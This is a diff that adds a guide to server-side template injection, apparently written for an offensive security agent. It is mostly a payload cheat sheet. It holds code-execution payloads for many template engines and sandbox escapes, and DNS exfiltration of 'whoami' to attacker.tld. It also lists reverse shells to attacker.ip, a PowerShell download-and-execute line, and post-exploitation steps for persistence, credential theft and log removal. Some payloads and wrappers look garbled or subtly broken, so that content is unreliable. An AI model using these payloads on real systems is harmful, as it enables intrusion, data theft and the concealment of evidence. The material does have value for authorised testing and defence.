@@ -1,0 +1,226 @@
+<server_side_template_injection_guide>
+<title>SERVER-SIDE TEMPLATE INJECTION (SSTI)</title>
+
+<critical>SSTI occurs when user input reaches template engines without sanitization, enabling expression evaluation, object traversal, and code execution. Modern engines are complex: subtle syntax differences, filter chains, and gadget availability differ across Jinja/Mako/Velocity/Smarty/Freemarker/Thymeleaf/Handlebars/EJS/ERB/Haml. Treat every user-controlled rendering as code execution until proven isolated.</critical>
+
+<scope>
+- Web/API endpoints rendering templates with dynamic input (emails, PDFs, HTML, reports)
+- Template languages: Jinja2/Jinja, Mako, Velocity, Smarty, Freemarker, Thymeleaf, Handlebars, EJS, ERB, Haml, Twig, Nunjucks, Marko, Dust
+- CMS/static site generators and their theme engines
+- No-code/low-code platforms with user-supplied templates
+- Microtemplate injections in smaller DSLs and expression languages
+- YAML/TOML/JSON deserialization triggering template evaluation
+</scope>
+
+<methodology>
+1. Identify injection points: user input in template rendering paths (email subjects/bodies, report headers, documentation, theme customization, dynamic HTML fragments, API response formatting).
+2. Establish context: which template engine, version, config (autoescape, filters, imports, globals), sandboxing. Compare error messages and timing between payloads.
+3. Start with blind probes: mathematical expressions ({% raw %}{{7*7}}{% endraw %}, {% raw %}<%= 3+4 %>{% endraw %}, ${7*7}) and string concatenation to differentiate template syntax.
+4. Escalate to object/attribute access ({% raw %}{{self}}{% endraw %}, {% raw %}{{request.application}}{% endraw %}, {% raw %}<%= system %>{% endraw %}) and method invocation.
+5. Chain to RCE: gadget chains, subprocess access, file operations, environment variable exfiltration. Validate on multiple instances and configs.
+</methodology>
+
+<discovery_techniques>
+<injection_points>
+- Form fields, query strings, headers (User-Agent, Referer, X-* custom), cookies, JSON bodies, GraphQL variables
+- File uploads (filename, metadata processed through template), email/SMS fields (to, subject, body, template selection)
+- API response formatting (pagination strings, filter expressions, aggregation labels, report titles)
+- Configuration/theme endpoints (CSS/JS generation, HTML exports, webhook templates, notification formats)
+- Hidden fields in responses (X-Template, X-Engine headers, HTML comments with engine hints, JavaScript frameworks detecting template syntax)
+</injection_points>
+
+<blind_probes>
+- Math: {% raw %}{{7*7}}{% endraw %}, {% raw %}${7*7}{% endraw %}, {% raw %}<%= 7*7 %>{% endraw %}, {% raw %}<%=7*7%>{% endraw %}, {{7*7}}, [=7*7=], <% 7*7 %>, #{7*7}
+- String concat: {% raw %}{{7*'7'}}{% endraw %}, {% raw %}${7*'7'}{% endraw %}, {% raw %}<%= 7*'7' %>{% endraw %}, {7*'7'}, [7*'7']
+- Reflection: {% raw %}{{self}}{% endraw %}, {% raw %}${self}{% endraw %}, {% raw %}<%= self %>{% endraw %}, {{ app }}, {{ env }}
+- Delays: {% raw %}{{7*7}}|default:sleep(5){% endraw %}, {% raw %}${Runtime.getRuntime().exec('sleep 5')}{% endraw %}, <% system('sleep 5') %>
+</blind_probes>
+
+<signal_detection>
+- Numeric: confirmed via length change, ETag diff, or response delay match
+- String: output appears verbatim or in predictable location (response body, error page, email preview)
+- Error-based: exception names, stack frames, template directive syntax revealed
+- Timing: secondary coercion or loop to introduce measurable latency
+- Header injection: injected into Set-Cookie, Location, Content-Disposition via template variable
+</signal_detection>
+
+<engine_fingerprinting>
+- Syntax diff tests: {% raw %}{{var}}{% endraw %} vs <%= var %> vs ${var} vs [=var=] vs {%var%}
+- Filter syntax: pipe (|), colon (:), space, semicolon
+- Loop/block syntax: {% raw %}{% for %}{% endraw %} vs <% for %> vs [% for %]
+- Comment markers: {# #}, <%# %>, /**/
+- Error messages: version string, engine name, file path, context variables leaked
+- Response headers: X-Template-Engine, X-Renderer, Server variant
+- Performance/timing deltas between similar payloads (cached vs fresh template compile)
+</engine_fingerprinting>
+</discovery_techniques>
+
+<detection_channels>
+<direct_output>
+- Expression result rendered inline (visible in response body, email, PDF)
+- Modified HTML structure detectable via diff/MutationObserver
+</direct_output>
+
+<error_based>
+- Coerce syntax/type errors leaking context, stack trace, engine version, accessible objects
+- Invalid filter/function names → list of available filters
+- Object traversal errors revealing parent scope hierarchy
+</error_based>
+
+<timing>
+- Loops: {% raw %}{%for i in range(1000000)%}{%endfor%}{% endraw %}, ${#set($x=0)}<% (0..1000000).each {$x++} %>
+- Sleep: {% raw %}{{self.__init__.__globals__.__builtins__.__import__('time').sleep(5)}}{% endraw %}, <%= `sleep 5` %>, ${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
+- Recursive traversal of deep object chains
+- Heavy computation: regex backtracking, string operations on huge strings
+</timing>
+
+<oast>
+- DNS exfiltration via {% raw %}{{self.__init__.__globals__.__builtins__.__import__('socket').gethostbyname('$(whoami).attacker.tld')}}{% endraw %} or equivalent per engine
+- HTTP callback via template fetching external URL or command execution piped to curl
+- Blind gadget chain confirmation via response length/ETag diff when side-effect triggers
+</oast>
+</detection_channels>
+
+<exploitation_techniques>
+<jinja2_mako>
+- Object/attribute traversal: {% raw %}{{self}}{% endraw %}, {% raw %}{{self.__dict__}}{% endraw %}, {% raw %}{{self.__init__.__globals__}}{% endraw %}
+- Builtin access: {% raw %}{{self.__init__.__globals__.__builtins__}}{% endraw %}, {% raw %}{{cycler.__init__.__globals__.os.popen('id').read()}}{% endraw %}
+- {% raw %}{{'__import__'.__class__.__mro__[1].__subclasses__()}}{% endraw %} to enumerate all classes → locate subprocess/popen/open
+- Filter chains: {% raw %}{{ payload|string|replace('x','y') }}{% endraw %} → filter composition for payload mutation
+- Namespace pollution: {% raw %}{% for x in y.__dict__ %}{% endraw %} to leak attributes when iteration supported
+- Macro nesting and recursion for computational gadgets
+- Safe string wrappers bypass: {% raw %}{{Markup(dangerous)}}{% endraw %}, {% raw %}{{value|safe}}{% endraw %} if autoescape disabled
+</jinja2_mako>
+
+<velocity_freemarker>
+- Silent null-deref for blind enumeration: ${obj.method()}, #set($x = $obj.method())
+- Class access: ${{}}, ${''.class}, ${Class.forName('java.lang.Runtime')}, #set($rt = $Runtime.getRuntime())
+- Method invocation chain: ${Runtime.getRuntime().exec('id')}
+- Built-in variables: ${.version}, ${.data_model}, ${.globals}
+- Macro definition for loop-based gadget chains: #macro(brute)#foreach($c in $rt)...#end#end
+</velocity_freemarker>
+
+<erb_haml_embedded>
+- Ruby code eval: <%= system('id') %>, <% exec('bash -c "..."') %>, <% `command` %>
+- Object access: <%= self.class %>, <%= Object.constants %>, <%= Gem.loaded_specs %>
+- Require/load: <%= require('socket'); TCPSocket.new(...) %>
+- Unsafe string interpolation: #{"#{7*7}"}
+</erb_haml_embedded>
+
+<smarty_twig_php>
+- Smarty: {php}$_POST['x']{/php}, {assign var=x value=$smarty.server.PHP_SELF}, {$smarty.ldelim}{$smarty.rdelim}
+- Twig: {{ _self }}, {{ self }}, {{ cycles }}, {% raw %}{% macro test() %}{% endmacro %}{% endraw %}
+- PHP filter chains: {{ string|replace|reverse|upper }}, passing payloads through multiple filters
+- Namespace traversal: Smarty plugin auto-load via template path, Twig Environment extension loading
+</smarty_twig_php>
+
+<thymeleaf_expression_lang>
+- SpEL (Spring Expression Language): ${T(java.lang.Runtime).getRuntime().exec('id')}
+- Thymeleaf-specific variables: [[${#string.abbreviate(text,17)}]], /*[[${payload}]]*/
+- Inline expressions: [[${{payload}}]], [(${payload})]
+- Attribute modification: th:text="${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}"
+- Conditional expressions with method chaining: [# th:if="${T(java.lang.System).getProperty('os.name')}"]
+</thymeleaf_expression_lang>
+
+<handlebars_nunjucks_ejs>
+- Handlebars: {{this}}, {{this.constructor}}, {{#each @root}} iteration over globals
+- Nunjucks: {{ foo() }}, {% raw %}{% set x = cycler.__init__.__globals__ %}{% endraw %}, filter composition
+- EJS: <%= process.env.FLAG %>, <% eval(Buffer.from(b64,'base64').toString()) %>
+- Built-in object leakage: <%= Object.keys(this) %>, {{ Object.getOwnPropertyNames(Function.prototype) }}
+</handlebars_nunjucks_ejs>
+
+<yaml_toml_json_injection>
+- YAML template engines: !!python/object/apply:os.system ["id"]
+- TOML embedded expressions if parser supports evaluation
+- JSON post-processing through template → inject via value interpolation
+- Polyglot injection: JSON string containing template syntax evaluated downstream
+</yaml_toml_json_injection>
+
+<polyglot_and_chained>
+- Multi-engine contexts: template output fed to second engine; craft payload valid for both
+- Format string → template: printf-style format strings evaluated as template expressions
+- Markdown/reStructuredText with embedded template/code block syntax
+- SVG/HTML templating: namespace confusion between template tags and HTML/SVG elements
+</polyglot_and_chained>
+
+<parser_differentials_and_normalization_bypass>
+- Encoding layering: URL → JSON → template, or template → HTML-encoded → browser decode → JS eval
+- Case and whitespace: {% raw %}{{7*7}}{% endraw %} vs {{7 *7}} vs {{ 7*7 }} vs {{7*7}}
+- Comment stripping vs evaluation: injection before/after template comment parsing
+- Directive reordering: {% raw %}{% set x=1 %}{% endraw %} vs inline vs post-evaluation
+- Filter/function aliasing: same function via different names or namespace collisions
+- Operator precedence abuse: ((7*7)), 7 * 7, 7*7, 7 **7
+- Null byte injection: {{ x%00y }}, terminating template processing early
+- Unicode normalization: смарт-кавычки (smart quotes) vs ASCII quotes confusing parsers
+- Variable shadowing: injection of reserved keywords or locals that override globals
+</parser_differentials_and_normalization_bypass>
+
+<gadget_chain_discovery>
+- Enumerate all accessible classes: {% raw %}{%for c in [].constructor.__init__.__globals__.values()%}{%if c.__name__=='__loader__'%}{{c.__self__}}{%endif%}{%endfor%}{% endraw %}
+- Process/subprocess gadgets: Runtime, ProcessBuilder, exec, system, backticks, %x{}, system(), popen()
+- File I/O gadgets: open(), fopen(), file_get_contents(), readFile(), File.read()
+- Network gadgets: socket, HTTP client, curl, wget, nc
+- Reflection gadgets: Class.forName(), getClass(), .__class__, constructor.prototype
+- Serialization/deserialization gadgets: ObjectInputStream, pickle, deserialize()
+- Import/require gadgets: __import__(), require(), include, load, exec(), eval()
+</gadget_chain_discovery>
+
+<sandbox_escape_vectors>
+- Deleted builtins restoration: {% raw %}{{[].__class__.__base__.__subclasses__()}}{% endraw %} to walk inheritance
+- Whitelist bypass: inject via attribute lookup instead of direct function reference
+- Implicit conversion: coerce object to string/number/boolean triggering __str__/__tostring__ with injected code
+- Iterator protocol: __iter__, __next__ abused for code execution during iteration
+- Context manager protocol: __enter__, __exit__ invoked during with block evaluation
+- Descriptor protocol: __get__, __set__, __delete__ triggered on attribute access
+- Metaclass abuse: __new__, __init__ invoked during class instantiation
+- Module introspection: sys.modules, importlib to load arbitrary code
+- Bytecode injection: compile() and exec()/eval() with crafted bytecode
+</sandbox_escape_vectors>
+
+<rce_primitives>
+<unix_and_linux>
+- Single-liner shells: /bin/bash -c, /bin/sh, Perl one-liner, Python -c, Ruby -e, Node.js -e
+- Command substitution: $(cmd), `cmd`, {% raw %}{{os.popen('id').read()}}{% endraw %}
+- Pipeline and redirection: | tee /tmp/x, && next_cmd, || fallback
+- Reverse shell: bash -i >& /dev/tcp/attacker.ip/port 0>&1, nc attacker.ip port -e /bin/bash
+- Alternative shells: /bin/ksh, /bin/tcsh, /bin/zsh
+- Kernel exploits via template gadgets accessing /proc/sys
+</unix_and_linux>
+
+<windows_cmd_powershell>
+- CMD: cmd /c command, cmd /C "command", for /l %i in (1,1,5) do command
+- PowerShell: powershell -Command "code", pwsh -c {code}, powershell -enc [Base64], IEX (New-Object Net.WebClient).DownloadString('url')
+- Windows API via .NET (Thymeleaf/SpEL context): Process.Start, System.Diagnostics.Process
+- Scheduled task abuse: schtasks /create, at command (deprecated but sometimes present)
+</windows_cmd_powershell>
+
+<code_execution_without_shell>
+- Direct subprocess: java.lang.Runtime, ProcessBuilder, System.exec(), os.spawn, fork+exec
+- Interpreted evaluation: eval(), exec(), system(), popen()
+- File write + inclusion: write web shell to webroot, then trigger inclusion/access
+- Template function definition: define function inline that executes code on next invocation
+- Unsafe deserialization chains: pickle, Java serialization, PHP unserialize()
+</code_execution_without_shell>
+</rce_primitives>
+
+<post_exploitation>
+- Environment variable extraction: env, environ, getenv, System.getenv
+- File system reconnaissance: ls, dir, find, Get-ChildItem, file permissions, /proc/self/status
+- Network access and lateral movement: curl/wget to internal services, DNS resolution of internal hosts
+- Persistence mechanisms: cron jobs, scheduled tasks, service creation, SSH key installation, web shell
+- Credential extraction: /etc/passwd, /etc/shadow (if readable), .ssh/authorized_keys, cloud metadata services
+- Log and evidence removal: rm, del, Clear-EventLog, history -c
+</post_exploitation>
+
+<high_value_targets>
+- Email rendering engines and bulk mailers (template in TO/FROM/SUBJECT/BODY)
+- PDF generators and report engines (server-side template rendering pre-conversion)
+- CMS theme/plugin systems with user-supplied templates
+- API response formatting and schema rendering
+- Webhook payload templating and notification systems
+- Code generation tools and build pipeline templates
+- Search result templating and faceted search rendering
+- Admin panels with template editing or preview functionality
+</high_value_targets>
+
+</server_side_template_injection_guide>
